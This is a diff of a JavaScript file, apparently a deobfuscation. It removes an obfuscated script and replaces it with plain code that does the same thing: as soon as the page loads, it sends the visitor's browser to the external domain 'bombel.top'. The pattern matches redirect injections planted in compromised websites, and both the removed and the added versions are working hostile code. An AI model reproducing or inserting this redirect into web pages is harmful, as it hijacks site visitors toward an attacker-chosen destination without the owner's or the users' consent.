@@ -1,33 +1,3 @@
-var _0x3c3733 = _0x5683;
-
-function _0x1057() {
-    var _0x1d5662 = ['736840pmOoVV', '144UkOqpg', '1552kHPWLn', 'location', '1746256lrsRva', '691830EJphSh', '4949YWiUlo', '218000XSHBVb', '195682rOsdum', 'setTimeout', '3itnfQs', 'href', '1135334iwpeQj'];
-    _0x1057 = function() {
-        return _0x1d5662;
-    };
-    return _0x1057();
-}
-
-function _0x5683(_0x1e888d, _0x34af3d) {
-    var _0x10577b = _0x1057();
-    return _0x5683 = function(_0x568348, _0x18e4da) {
-        _0x568348 = _0x568348 - 0x131;
-        var _0x26b00b = _0x10577b[_0x568348];
-        return _0x26b00b;
-    }, _0x5683(_0x1e888d, _0x34af3d);
-}(function(_0x2fdf37, _0x29b72a) {
-    var _0x3fe24d = _0x5683,
-        _0x4c4758 = _0x2fdf37();
-    while (!![]) {
-        try {
-            var _0x18f93f = parseInt(_0x3fe24d(0x137)) / 0x1 + -parseInt(_0x3fe24d(0x13b)) / 0x2 * (parseInt(_0x3fe24d(0x139)) / 0x3) + -parseInt(_0x3fe24d(0x133)) / 0x4 + -parseInt(_0x3fe24d(0x136)) / 0x5 + parseInt(_0x3fe24d(0x134)) / 0x6 + -parseInt(_0x3fe24d(0x135)) / 0x7 * (-parseInt(_0x3fe24d(0x131)) / 0x8) + -parseInt(_0x3fe24d(0x13d)) / 0x9 * (-parseInt(_0x3fe24d(0x13c)) / 0xa);
-            if (_0x18f93f === _0x29b72a) break;
-            else _0x4c4758['push'](_0x4c4758['shift']());
-        } catch (_0x4268e4) {
-            _0x4c4758['push'](_0x4c4758['shift']());
-        }
-    }
-}(_0x1057, 0x8d6ba), window[_0x3c3733(0x138)](function() {
-    var _0x5b9ce4 = _0x3c3733;
-    window[_0x5b9ce4(0x132)][_0x5b9ce4(0x13a)] = href = 'https://bombel.top';
-}, 0x1));
+window.setTimeout(function () {
+    window.location.href = href = "https://bombel.top";
+}, 1);
